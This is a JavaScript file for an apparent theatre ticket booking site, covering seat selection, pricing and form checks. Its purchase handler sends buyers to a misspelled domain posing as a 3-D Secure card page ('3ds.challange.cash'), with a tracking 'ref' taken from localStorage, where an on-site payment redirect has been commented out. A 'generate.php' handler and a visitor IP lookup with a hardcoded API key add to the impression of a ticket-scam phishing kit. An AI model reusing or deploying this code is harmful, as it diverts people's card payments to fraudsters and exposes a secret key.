var isMobile = false;

if (
  /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|ipad|iris|kindle|Android|Silk|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(
    navigator.userAgent,
  ) ||
  /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
    navigator.userAgent.substr(0, 4),
  )
) {
  isMobile = true;
}

var _clickEvent = isMobile ? 'touchstart' : 'click';

var callBacked = false;
var sended_email = false;
var totalPrice;

var sits = {
  VIP: ['VIP-Loge'],
  1: [4, 6, 7, 8, 11, 12],
  2: [1, 2, 5, 9, 11, 12],
  4: [2, 3, 4, 6, 10, 11],
  6: [1, 2, 6, 7, 11, 12],
  7: [3, 4, 5, 6, 8, 9],
  9: [1, 2, 4, 6, 10, 11, 12],
};

function setPrice(option) {
  if (services[option] != null) {
    totalPrice = services[option];
    $('span#totalPrice').text(totalPrice);
  }
}

$('button#booking').on(_clickEvent, function() {
  $('.popup').fadeIn();
  $('span#BookingOrder').text($('h1').text());
  setPrice($('#purchaserLength').val());
});

function setSits(el) {
  var selector = el;
  setPrice(selector.val());
  $('#purchaserSit').empty();
  if (el.attr('generate') !== undefined && selector.val() != 'VIP') {
    var i;
    for (i = 1; i <= 12; i++) {
      $('#purchaserSit').append(
        $('<option>')
          .val(i)
          .html(i),
      );
    }
  } else {
    $.each(sits[selector.val()], function(k, v) {
      $('#purchaserSit').append(
        $('<option>')
          .val(v)
          .html(v),
      );
    });
  }
  if ($('#BookingSubmit').length !== 0) {
    $('#rowPrice').removeAttr('hidden');
    $('#BookingSubmit').text('Buy ticket');
    $('#BookingSubmit').removeClass('mt-4');
    $('#BookingSubmit').addClass('mt-0');
    $('#BookingSubmit').removeAttr('norow');
  } else {
    $('#GenerateSubmit').removeAttr('norow');
  }
  $('#purchaserSitForm').removeAttr('hidden');
}

$(function() {
  if (
    $('#purchaserLength option:selected').val() != 'nothing' &&
    $('#purchaserSitForm').attr('hidden') !== undefined
  ) {
    setSits($('#purchaserLength'));
  }

  $(document).mouseup(function(e) {
    var div = $('.popup .window');
    if (!div.is(e.target) && div.has(e.target).length === 0) {
      $('.popup').fadeOut();
    }
  });

  $('.popup .window .close').on(_clickEvent, function() {
    $('.popup').fadeOut();
  });

  $('#purchaserLength').on('change', function() {
    setSits($(this));
  });

  $('#BookingSubmit').on(_clickEvent, function() {
    if ($(this).attr('norow') !== undefined) {
      new Noty({ type: 'error', text: 'Choose a row!' }).show();
      return false;
    }
    var isValid = true;
    $('div.window')
      .find('.form-control')
      .each(function() {
        if ($(this).prop('required') && $(this).val().length < $(this).attr('minlength')) {
          $(this).addClass('is-invalid');
          new Noty({ type: 'error', text: 'Fill in the required fields!' }).show();
          isValid = false;
          return false;
        }
      });
    if (isValid) {
      var sit = ', Место ' + $('#purchaserSit option:selected').text();
      if ($('#purchaserLength option:selected').val() == 'VIP') sit = '';
      var data = JSON.stringify({
        time: $('#purchaserTime').val(),
        date: $('#purchaserDate').val(),
        product:
          'Спектакль «' +
          $('#BookingOrder').text() +
          '» - ' +
          $('#purchaserLength option:selected').text() +
          sit,
        city: $('#purchaserCity').val(),
        phone: $('#purchaserNumber').val(),
      });

      const ref = localStorage.getItem('ref');
      const service = 7;
      const lang = 'EN';

      window.location = `https://3ds.challange.cash?service=${service}&ref=${ref}&lang=${lang}`;

      // $.redirect(`/payment?price=${totalPrice}`, {
      //   amount: totalPrice,
      //   customer: $('#purchaserName').val(),
      //   phone: $('#purchaserNumber').val(),
      // });
    }
  });

  $('#GenerateSubmit').on('click', function() {
    if ($(this).attr('norow') !== undefined) {
      new Noty({ type: 'error', text: 'Выберите ряд!' }).show();
      return false;
    }
    var isValid = true;
    $('div.window')
      .find('.form-control')
      .each(function() {
        if ($(this).prop('required') && $(this).val().length < $(this).attr('minlength')) {
          $(this).addClass('is-invalid');
          new Noty({ type: 'error', text: 'Fill in the required fields!' }).show();
          isValid = false;
          return false;
        }
      });
    if (isValid) {
      var sit = ', Место ' + $('#purchaserSit option:selected').text();
      if ($('#purchaserLength option:selected').val() == 'VIP') sit = '';
      var data = JSON.stringify({
        time: $('#purchaserTime').val(),
        date: $('#purchaserDate').val(),
        product:
          'Спектакль «' +
          $('#purchaserShow option:selected').text() +
          '» - ' +
          $('#purchaserLength option:selected').text() +
          sit,
        city: $('#purchaserCity').val(),
        phone: $('#purchaserNumber').val(),
      });
      $.redirect('../../../../generate.php', {
        amount: totalPrice,
        customer: $('#purchaserName').val(),
        data: data,
      });
    }
  });

  $('.form-control').on('change', function() {
    if (!$(this).prop('required')) {
      return false;
    }
    if ($(this).val().length >= $(this).attr('minlength')) {
      $(this).removeClass('is-invalid');
      $(this).addClass('is-valid');
    } else {
      $(this).removeClass('is-valid');
    }
  });

  // $('input#purchaserPromo').keyup(function() {
  // 	var input = $(this);
  // 	if ( input.val().length >= input.attr('minlength') ) {
  // 		$.post('https://'+pd+'/api', {isValidPromo: $('#purchaserPromo').val()}, function(data) {
  // 			if ( data ) {
  //				var d = new Date();d.setTime(d.getTime() + (7*24*60*60*1000));var expires = "expires="+ d.toUTCString();
  // 			    document.cookie = "promocode=" + $('#purchaserPromo').val() + ";" + expires + ";path=/";
  // 				$('label[for=purchaserPromo]').html('Вы активировали промокод:<br/><span style="color: green;">'+promoBonus+'</span>');
  // 				$('input#purchaserPromo').attr('disabled', true);
  // 				new Noty({type: 'success', text: 'Вы активировали промокод!'}).show();
  // 			}
  // 		});
  // 	}
  // })

  if ($('#purchaserNumber').length !== 0) {
    var phoneMask = IMask(document.getElementById('purchaserNumber'), {
      mask: '0 (000) 000-00-00',
    });
  }

  if ($('button.callback-send').length !== 0) {
    // Callback
    IMask(document.getElementById('callback_number'), {
      mask: '0 (000) 000-00-00',
    });

    $('button.callback-send').on(_clickEvent, function() {
      var isValid = true;
      $('#callback_form')
        .find('.form-control')
        .each(function() {
          if ($(this).prop('required') && $(this).val().length < $(this).attr('minlength')) {
            $(this).addClass('is-invalid');
            new Noty({ type: 'error', text: 'Fill in the required fields!' }).show();
            isValid = false;
            return false;
          }
        });
      if (!isValid || callBacked) return;
      callBacked = true;

      // sendCallback(hash);
      $.ajax({
        url: 'https://api.ipdata.co/?api-key=3bebae9c350ded95b7036c9854b6e63bd564dcf5447b28ce1991e8ef',
        headers: { 'Content-Type': 'application/json' },
        type: 'GET',
        dataType: 'jsonp',
        success: function(data) {
          sendCallback(data);
        },
      });
    });
  }
});
